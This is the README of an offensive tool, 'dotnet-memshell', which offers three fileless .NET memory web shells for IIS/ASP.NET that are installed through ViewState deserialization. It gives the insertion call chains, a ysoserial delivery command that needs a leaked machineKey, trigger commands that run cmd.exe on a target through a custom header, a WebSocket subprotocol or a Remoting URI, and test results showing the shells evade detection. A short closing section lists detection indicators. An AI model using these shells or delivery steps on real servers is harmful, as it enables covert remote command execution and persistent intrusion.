# dotnet-memshell

> **âš ï¸ For authorized security testing only.** Â· [ä¸­æ–‡](README.zh-CN.md)

[![.NET Framework 4.5+](https://img.shields.io/badge/.NET%20Framework-4.5%2B-blue?style=flat-square)](https://dotnet.microsoft.com/)
[![Payload Files](https://img.shields.io/badge/Payload%20Files-1%20single%20.cs-green?style=flat-square)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![Insertion Positions](https://img.shields.io/badge/Insertion%20Positions-3%20distinct-critical?style=flat-square)]()
[![Unmarked Traffic Impact](https://img.shields.io/badge/Unmarked%20Traffic%20Impact-0-critical?style=flat-square)]()
[![New Ports / web.config / File Drops](https://img.shields.io/badge/New%20Ports%20%C2%B7%20web.config%20%C2%B7%20File%20Drops-0-critical?style=flat-square)]()

**Three .NET memory shells at three distinct insertion positions** â€” single-file payloads, armed by one deserialization, invisible to unmarked traffic.

Most public .NET memory shells (module / handler / route / VirtualPathProvider) all live inside the HTTP request pipeline at already-known positions. dotnet-memshell spreads across **three different layers** instead: the pipeline event layer (with pool broadcast), the **HTTPâ†’WebSocket upgrade point** (connection takeover â€” the .NET port of the WebSocket memory-shell idea), and an **already-registered Remoting channel** (container-style endpoint registration). All three ride the target's existing endpoints: no new port, no `web.config` change, no file on disk.

> âš ï¸ **For authorized security testing only.** Using these techniques against systems you do not have written permission to test is illegal. You are solely responsible for your actions.

---

## ðŸŽ¯ The Three Shells

| # | Shell | Insertion position | Trigger | Minimum privilege | Business impact |
|---|---|---|---|---|---|
| 1 | **HttpModuleShell** | `HttpApplication` module-event pipeline | any request with `MSH-Cmd: <cmd>` header | default app-pool identity | unmarked requests: zero disturbance |
| 2 | **WsTakeoverShell** | HTTPâ†’WebSocket upgrade transition | handshake with subprotocol `msh` | app-pool identity + integrated pipeline + WS feature | non-handshake requests: strict no-op |
| 3 | **RemotingUriShell** | AppDomain-global URI table of an existing Remoting channel | remoting call to `<channel>/msh` | app-pool identity + business hosts Remoting | business URIs coexist untouched |

```
HTTP.sys / IIS
 â””â”€ ASP.NET request pipeline
     â”œâ”€ module events (BeginRequestâ€¦)      â† #1 HttpModuleShell
     â”œâ”€ routing / VPP / handler / endpoint  (known families â€” not covered here)
     â””â”€ upgrade point (HTTPâ†’WS handshake)   â† #2 WsTakeoverShell

in-process protocol stacks
 â””â”€ existing Remoting server channel        â† #3 RemotingUriShell
```

## âš¡ What Makes These Different

| Property | dotnet-memshell |
|---|---|
| New listening port | âœ… none â€” #1/#2 ride the site's 80/443, #3 rides the business channel |
| `web.config` / registry / URLACL changes | âœ… none (contrast: HttpListener shells need `netsh urlacl`, an admin action) |
| Files dropped | âœ… none â€” payloads are single `.cs` files compiled into the deserialization, assembly loaded from bytes (`Location` empty) |
| Effect on unmarked traffic | âœ… none â€” every trigger checks a magic marker first and returns immediately |
| Pool coverage | âœ… `HttpApplicationFactory._freeList` broadcast â€” arming only the serving instance misses most requests (verified) |
| Graceful degradation | âœ… #2 on non-integrated pools catches and passes through (verified: handshake request still returns 200) |

## ðŸ§­ Call Chains

**#1 HttpModuleShell**
```
delivery deserialization â†’ E()
 â”œâ”€ HttpContext.Current.ApplicationInstance            (serving instance)
 â””â”€ HttpApplicationFactory._theApplicationFactory._freeList  (pool broadcast)
      per instance:
      â”œâ”€ integrated: GetModuleContainer(<module>)
      â”‚    â†’ new SyncEventExecutionStep(app, OnRequest)        [reflection]
      â”‚    â†’ ModuleContainer.AddEvent(BeginRequest, false, step)
      â””â”€ classic:    ApplicationStepManager._execSteps append  [append-only â€” inserting
                                                                     before the cursor re-executes
                                                                     the current step]
trigger: request â†’ BeginRequest â†’ step â†’ OnRequest
      â”œâ”€ no MSH-Cmd header â†’ return (business continues untouched)
      â””â”€ header â†’ cmd.exe /c â†’ Response.Write â†’ End
```

**#2 WsTakeoverShell**
```
same anchor; handler is a strict no-op unless handshake+msh
GET + Upgrade: websocket + Sec-WebSocket-Protocol: msh
 â†’ IsWebSocketRequest check â†’ AcceptWebSocketRequest(Duplex)
 â†’ connection upgraded, request pipeline terminates, duplex stream owned by the loop
 â†’ Receive(cmd) â†’ exec â†’ Send(output) â€¦ until Close frame
```

**#3 RemotingUriShell**
```
E()
 â”œâ”€ AppDomain.AssemblyResolve â† bridges byte-loaded assembly (formatter resolves
 â”‚                               well-known types by assembly NAME)
 â”œâ”€ guard: an IChannelReceiver already exists (business hosts remoting)
 â””â”€ RegisterWellKnownServiceType(E.Svc, "msh", Singleton)
trigger: remoting client â†’ tcp://host:<business-port>/msh â†’ Svc.Exec(cmd)
```

## âœ… Verification (Windows 11 + IIS 10 integrated pipeline, real host)

| Item | Result | Evidence |
|---|---|---|
| **#1 HttpModuleShell** | âœ… | `MSH-Cmd: __verify__` â†’ `armed; integrated=True`; `MSH-Cmd: whoami` â†’ `iis apppool\defaultapppool`; unmarked request 200 |
| **#2 WsTakeoverShell** | âœ… | handshake subprotocol `msh` â†’ full-duplex after 101: `whoami` â†’ `iis apppool\defaultapppool`, `hostname` â†’ `your-host`, clean close |
| **#3 RemotingUriShell** | âœ… | business `calc(7,8)=15` and shell `/msh whoami` **coexist on the same port/channel**; business call again `calc(100,1)=101` |
| Isolation | âœ… | normal requests 200; unrelated headers ignored; business WS (no `msh` subprotocol) not hijacked |

### Three measured, non-obvious facts

1. **Notification choice**: when adding to a module container, only **`RequestNotification.AcquireRequestState`** fires. `BeginRequest` / `LogRequest` / `UpdateRequestCache` on the same containers did **not** dispatch (hit counter stayed 0).
2. **WebSocket takeover needs output suppression**: after `AcceptWebSocketRequest` the page handler still runs, so the handler must set `Response.SuppressContent = true` and `Response.StatusCode = 101`, otherwise the connection is torn down (`WebSocketException 0x80070040`). `RemapHandler` is not usable at that stage (framework allows it only before `MapRequestHandler`).
3. **Remoting clients must reference the service assembly** so the proxy type name matches the server's (inherent Remoting requirement, not a shell defect).

## ðŸ”Œ Usage

Generate & deliver (requires a known/leaked `machineKey`):
```bash
ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile \
  -c "payloads\HttpModuleShell.cs;System.dll;System.Web.dll" \
  --decryptionalg=AES --decryptionkey=<HEX> \
  --validationalg=HMACSHA256 --validationkey=<HEX> \
  --path=/Default.aspx --apppath=/
# POST __VIEWSTATE=<payload> to any ViewState-enabled page
# (RemotingUriShell: swap refs to System.dll;System.Runtime.Remoting.dll)
```

Trigger:
```powershell
# #1
Invoke-WebRequest http://target/Default.aspx -Headers @{ 'MSH-Cmd' = 'whoami' }
# #2 â€” any WebSocket client
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ws.Options.AddSubProtocol('msh')
$ws.ConnectAsync([Uri]'ws://target/Default.aspx', [Threading.CancellationToken]::None).Wait()
# #3
RemotingShellClient.exe tcp://target:<business-port>/msh "whoami"
```

Local testing without ysoserial: `tools/build.ps1` + `tools/Loader.aspx` (lab-only loader, never deploy it).

## ðŸ“Œ Delivery Findings (measured)

| Gadget | Executes on deserialization? | Note |
|---|---|---|
| `XamlAssemblyLoadFromFile` | âœ… | loads & instantiates during XAML parse â€” **used here** |
| `ActivitySurrogateSelectorFromFile` | âŒ | its `AxHost.State` wrapper stores `PropertyBagBinary` lazily; plain ViewState never triggers it |
| `TypeConfuseDelegate` | âš ï¸ | executes via `Process.Start` (out-of-process) â€” not a memory shell |

Also measured: ysoserial's ViewState plugin has a ~32K `Uri.EscapeDataString` input limit (gzip-embed if you inline a large assembly); the single delivery POST returns a one-time viewstate error page, subsequent requests are normal.

## ðŸ” Detection

- Per-`HttpApplication` module-container step lists / `_execSteps` length vs framework-built values
- `AppDomain.GetAssemblies()` entries with empty `Location` (byte-loaded)
- Unfamiliar WS subprotocols; connections outliving the request pipeline
- Reflect `RemotingConfiguration` internals for undeclared well-known URIs
- Treat `machineKey` as a high-value credential (leak = ViewState RCE surface); monitor worker processes spawning `cmd.exe`

## ðŸ“œ License & References

MIT â€” see [LICENSE](LICENSE).

- [veo/wsMemShell](https://github.com/veo/wsMemShell) â€” WebSocket memory-shell idea (Java)
- [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) â€” payload generation
- HttpModule injection technique from 2023 Chinese security-community research; this repo adds the pool broadcast and the classic-pipeline fallback.

